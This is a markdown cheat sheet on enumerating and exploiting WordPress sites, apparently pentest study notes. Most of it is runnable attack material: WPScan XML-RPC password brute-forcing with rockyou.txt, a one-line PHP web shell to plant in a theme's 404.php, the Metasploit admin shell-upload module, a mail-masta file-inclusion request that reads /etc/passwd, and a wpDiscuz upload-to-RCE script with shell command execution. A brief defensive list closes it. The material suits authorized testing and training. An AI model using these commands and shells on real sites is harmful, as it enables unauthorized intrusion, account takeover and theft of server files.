# WordPress - Enumeration & Exploitation

## 🧠 Overview

WordPress is the most widely used CMS in the world.

Because of its popularity, it is also one of the most targeted platforms during:

- Pentests  
- Bug bounty programs  
- Real-world attacks  

Common attack vectors include:

- Weak credentials  
- Vulnerable plugins  
- Vulnerable themes  
- File upload flaws  
- Code execution through admin access  

---

# 🔍 WordPress Discovery / Footprinting

## 🧪 Common Indicators

### 🔹 robots.txt

A quick way to identify WordPress:

```text id="9i9d5r"
/robots.txt
````

---

### 🔹 Admin Panel

Accessing:

```text id="6i3g7j"
/wp-admin
```

usually redirects to:

```text id="9r9k1l"
/wp-login.php
```

➡️ Main login portal.

---

### 🔹 Plugins Directory

```text id="v4u5kn"
/wp-content/plugins/
```

Useful for:

* Plugin enumeration
* Version disclosure
* Vulnerability discovery

---

### 🔹 Themes Directory

```text id="q0z6bt"
/wp-content/themes/
```

Important because:

```text id="m6t0ee"
Themes may allow direct PHP editing
```

➡️ Potential RCE path.

---

# 👥 Default WordPress Roles

| Role          | Permissions           |
| ------------- | --------------------- |
| Administrator | Full website control  |
| Editor        | Manage all posts      |
| Author        | Manage own posts      |
| Contributor   | Write but not publish |
| Subscriber    | Read/edit own profile |

---

# 🔍 Enumeration

# 🧪 Identify WordPress

```bash id="r7f2sx"
curl -s http://TARGET | grep WordPress
```

---

# 🎨 Enumerate Themes

```bash id="m8v1qz"
curl -s http://TARGET | grep themes
```

---

# 🔌 Enumerate Plugins

```bash id="d0r4mz"
curl -s http://TARGET | grep plugins
```

---

# 🤖 WPScan

## 🚀 Full Enumeration

```bash id="j9f3cc"
sudo wpscan \
--url http://TARGET \
--enumerate \
--api-token YOUR_TOKEN
```

---

# 🧠 WPScan Can Discover

* Plugins
* Themes
* Users
* Version numbers
* Known vulnerabilities

---

# 💥 Attacking WordPress

# 🔓 Login Bruteforce

## 🚀 XML-RPC Attack

```bash id="y6r7px"
sudo wpscan \
--password-attack xmlrpc \
-t 20 \
-U john \
-P /usr/share/wordlists/rockyou.txt \
--url http://TARGET
```

---

# ⚠️ Why XML-RPC Matters

XML-RPC can:

* Speed up bruteforce attacks
* Bypass login protections
* Generate many auth attempts in one request

---

# 💥 Code Execution via Theme Editor

## 🧠 Overview

Administrators can edit PHP theme files directly.

➡️ Admin access often equals:

```text id="x3f2zv"
RCE
```

---

# 🚀 Exploitation Flow

```text id="w7d4dr"
Login as Admin
↓
Appearance
↓
Theme Editor
↓
Modify PHP file
↓
Execute commands
```

---

# 📂 Common Target

```text id="v8z9yq"
404.php
```

---

# 🧪 Simple Web Shell

```php id="n4m3du"
<?php
system($_GET[0]);
?>
```

---

# 🚀 Execute Commands

```text id="x5r1zm"
http://TARGET/wp-content/themes/THEME/404.php?0=id
```

---

# 🔥 Metasploit Shell Upload

## Module

```text id="r0d9oi"
exploit/unix/webapp/wp_admin_shell_upload
```

---

# 🚀 Usage

```text id="u8t5kr"
use exploit/unix/webapp/wp_admin_shell_upload
```

Configure:

* RHOST
* LHOST
* Credentials
* VHOST

Then run:

```text id="v7x2ja"
exploit
```

---

# 🔥 Vulnerable Plugins

# 📧 mail-masta

## 🧠 Vulnerability

File inclusion via:

```text id="x2n9g7"
pl GET parameter
```

---

# 🚀 Exploitation

```bash id="k1d5vl"
curl -s \
http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

---

# 💥 Result

Potential Local File Inclusion (LFI).

---

# 💬 wpDiscuz

## 🧠 Vulnerability

Affects:

```text id="q4v7tl"
wpDiscuz 7.0.4
```

---

# 💥 Vulnerability Type

Unauthenticated file upload → RCE.

---

# 🚀 Exploitation

```bash id="y9h4od"
python3 wp_discuz.py \
-u http://TARGET \
-p /?p=1
```

---

# 🧪 Execute Commands

```bash id="x1f6sp"
curl -s \
http://TARGET/wp-content/uploads/2021/08/shell.php?cmd=id
```

---

# 🧠 Why This Works

The plugin only intended to allow image uploads.

However:

```text id="k5v0el"
MIME validation could be bypassed
```

➡️ Malicious PHP upload possible.

---

# 🔥 Common WordPress Attack Paths

| Vector             | Goal         |
| ------------------ | ------------ |
| Weak credentials   | Admin access |
| Theme editor       | RCE          |
| Vulnerable plugins | RCE / LFI    |
| XML-RPC            | Bruteforce   |
| Upload flaws       | Web shell    |

---

# 🧠 Pentester Mindset

When assessing WordPress:

```text id="t6k8qt"
Enumerate plugins
Enumerate themes
Check XML-RPC
Look for vulnerable extensions
Test admin functionality
```

---

# ⚠️ High-Value Directories

| Path                  | Purpose                     |
| --------------------- | --------------------------- |
| `/wp-admin`           | Admin portal                |
| `/wp-login.php`       | Login page                  |
| `/wp-content/plugins` | Plugins                     |
| `/wp-content/themes`  | Themes                      |
| `/uploads`            | Potential web shell storage |

---

# 🛡️ Defensive Measures

* Update plugins/themes regularly
* Disable theme/plugin editing
* Restrict XML-RPC if unused
* Use strong admin credentials
* Monitor file uploads
* Remove vulnerable extensions

